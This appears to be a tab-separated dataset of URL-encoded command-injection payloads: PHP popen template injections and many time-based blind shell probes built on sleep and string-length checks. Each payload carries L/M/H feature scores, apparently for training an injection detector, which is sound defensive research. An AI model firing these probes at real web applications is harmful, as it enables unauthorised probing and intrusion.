attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
${popen(print(`echo%20frwtrm;echo%20$((11%2b41));echo%20frwtrm;echo%20frwtrm`)%3b.%2522frwtrm	H	L	L	M	M	M	L	M	
${popen(print(`echo%20lsifor%0aecho%20$((86%2b39))%0aecho%20lsifor%0aecho%20lsifor`)%3b.%252522lsifor	L	L	L	L	M	M	L	M	
${popen(print(`echo%20fjkmcs\necho%20$((43%2b2))\necho%20fjkmcs\necho%20fjkmcs`)%3b.%25252522fjkmcs	H	L	L	L	M	M	L	M	
${popen(print(`echo%20xzrrjd`.`echo%20$((95%2b86))`.`echo%20xzrrjd`.`echo%20xzrrjd`)%3b.%27xzrrjd	H	L	L	L	M	M	L	M	
${popen(print(`echo%20mveaqd;echo%20$((64%2b58));echo%20mveaqd;echo%20mveaqd`)%3b.%2527mveaqd	H	L	L	M	M	M	L	M	
${popen(print(`echo%20bzeayt%0aecho%20$((11%2b35))%0aecho%20bzeayt%0aecho%20bzeayt`)%3b.%252527bzeayt	L	L	L	L	M	M	L	M	
${popen(print(`echo%20ztpgau\necho%20$((52%2b3))\necho%20ztpgau\necho%20ztpgau`)%3b.%25252527ztpgau	H	L	L	L	M	M	L	M	
${popen(print(`echo%20lbevll`.`echo%20$((2%2b31))`.`echo%20lbevll`.`echo%20lbevll`)%29%7dlbevll	H	L	L	L	M	M	L	M	
${popen(print(`echo%20bzlgpl;echo%20$((70%2b63));echo%20bzlgpl;echo%20bzlgpl`)%3b%2529%257dbzlgpl	H	L	L	M	M	M	L	M	
${popen(print(`echo%20slxbwn%0aecho%20$((29%2b57))%0aecho%20slxbwn%0aecho%20slxbwn`)%3b%252529%25257dslxbwn	L	L	L	L	M	M	L	M	
${popen(print(`echo%20qdxudj\necho%20$((17%2b75))\necho%20qdxudj\necho%20qdxudj`)%3b%25252529%2525257dqdxudj	H	L	L	L	M	M	L	M	
%3b%20str%3d%24%28echo%20zssqmt%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20zssqmt%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20zssqmt%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20zssqmt%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20zssqmt%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20zssqmt%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20zssqmt%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20zssqmt%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20zssqmt%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20	L	L	L	M	L	L	L	H	
%7c%20%5b%201%20-ne%20%24%28echo%20rbbjar%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%202%20-ne%20%24%28echo%20rbbjar%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%203%20-ne%20%24%28echo%20rbbjar%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%204%20-ne%20%24%28echo%20rbbjar%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%205%20-ne%20%24%28echo%20rbbjar%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%206%20-ne%20%24%28echo%20rbbjar%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%207%20-ne%20%24%28echo%20rbbjar%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%208%20-ne%20%24%28echo%20rbbjar%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%7c%20%5b%209%20-ne%20%24%28echo%20rbbjar%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20	L	L	L	L	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20ehnnqt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%201%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20ehnnqt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%202%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20ehnnqt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%203%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20ehnnqt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%204%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20ehnnqt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%205%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20ehnnqt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%206%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20ehnnqt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%207%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20ehnnqt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%208%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20ehnnqt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%209%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20gouirv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20gouirv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20gouirv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20gouirv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20gouirv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20gouirv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20gouirv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20gouirv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20gouirv%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20tnpfba%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%27	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20tnpfba%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%27	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20tnpfba%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%27	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20tnpfba%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%27	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20tnpfba%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%27	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20tnpfba%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%27	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20tnpfba%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%27	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20tnpfba%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%27	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20tnpfba%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%27	L	L	L	M	L	L	L	H	
%7c%20%5b%201%20-ne%20%24%28echo%20zdevvw%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%27	L	L	L	L	M	L	L	H	
%7c%20%5b%202%20-ne%20%24%28echo%20zdevvw%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%27	L	L	L	L	M	L	L	H	
%7c%20%5b%203%20-ne%20%24%28echo%20zdevvw%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%27	L	L	L	L	M	L	L	H	
%7c%20%5b%204%20-ne%20%24%28echo%20zdevvw%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%27	L	L	L	L	M	L	L	H	
%7c%20%5b%205%20-ne%20%24%28echo%20zdevvw%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%27	L	L	L	L	M	L	L	H	
%7c%20%5b%206%20-ne%20%24%28echo%20zdevvw%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%27	L	L	L	L	M	L	L	H	
%7c%20%5b%207%20-ne%20%24%28echo%20zdevvw%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%27	L	L	L	L	M	L	L	H	
%7c%20%5b%208%20-ne%20%24%28echo%20zdevvw%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%27	L	L	L	L	M	L	L	H	
%7c%20%5b%209%20-ne%20%24%28echo%20zdevvw%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%27	L	L	L	L	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fwehdm%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%201%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%27	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fwehdm%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%202%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%27	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fwehdm%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%203%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%27	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fwehdm%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%204%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%27	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fwehdm%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%205%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%27	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fwehdm%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%206%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%27	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fwehdm%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%207%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%27	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fwehdm%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%208%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%27	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20fwehdm%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%209%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%27	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dpbavn%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%27	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dpbavn%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%27	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dpbavn%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%27	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dpbavn%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%27	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dpbavn%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%27	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dpbavn%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%27	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dpbavn%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%27	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dpbavn%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%27	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20dpbavn%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%27	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20poekqx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%22	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20poekqx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%22	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20poekqx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%22	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20poekqx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%204%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%22	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20poekqx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%205%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%22	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20poekqx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%206%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%22	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20poekqx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%207%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%22	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20poekqx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%208%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%22	L	L	L	M	L	L	L	H	
%3b%20str%3d%24%28echo%20poekqx%29%3b%20str1%3d%24%7b%23str%7d%3b%20if%20%5b%209%20-ne%20%24%7bstr1%7d%20%5d%3b%20then%20sleep%200%3b%20else%20sleep%201%3b%20fi%20%22	L	L	L	M	L	L	L	H	
%7c%20%5b%201%20-ne%20%24%28echo%20mrdzpj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%22	L	L	L	L	M	L	L	H	
%7c%20%5b%202%20-ne%20%24%28echo%20mrdzpj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%22	L	L	L	L	M	L	L	H	
%7c%20%5b%203%20-ne%20%24%28echo%20mrdzpj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%22	L	L	L	L	M	L	L	H	
%7c%20%5b%204%20-ne%20%24%28echo%20mrdzpj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%22	L	L	L	L	M	L	L	H	
%7c%20%5b%205%20-ne%20%24%28echo%20mrdzpj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%22	L	L	L	L	M	L	L	H	
%7c%20%5b%206%20-ne%20%24%28echo%20mrdzpj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%22	L	L	L	L	M	L	L	H	
%7c%20%5b%207%20-ne%20%24%28echo%20mrdzpj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%22	L	L	L	L	M	L	L	H	
%7c%20%5b%208%20-ne%20%24%28echo%20mrdzpj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%22	L	L	L	L	M	L	L	H	
%7c%20%5b%209%20-ne%20%24%28echo%20mrdzpj%20%7c%20tr%20-d%20%27%5cn%27%20%7c%20wc%20-c%29%20%5d%20%7c%7c%20sleep%201%20%22	L	L	L	L	M	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20vgafpt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%201%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%22	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20vgafpt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%202%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%22	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20vgafpt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%203%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%22	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20vgafpt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%204%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%22	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20vgafpt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%205%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%22	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20vgafpt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%206%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%22	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20vgafpt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%207%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%22	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20vgafpt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%208%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%22	L	L	L	M	L	L	L	H	
%26%20sleep%200%20%26%26%20str%3d%24%28echo%20vgafpt%29%20%26%26%20str1%3d%24%7b%23str%7d%20%26%26%20%5b%209%20-eq%20%24%7bstr1%7d%20%5d%20%26%26%20sleep%201%20%22	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20zsoawg%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%201%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%22	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20zsoawg%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%202%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%22	L	L	L	M	L	L	L	H	
%0a%20str%3d%24%28echo%20zsoawg%29%0a%20str1%3d%24%7b%23str%7d%0a%20if%20%5b%203%20-ne%20%24%7bstr1%7d%20%5d%0a%20then%20sleep%200%0a%20else%20sleep%201%0a%20fi%20%22	L	L	L	M	L	L	L	H	
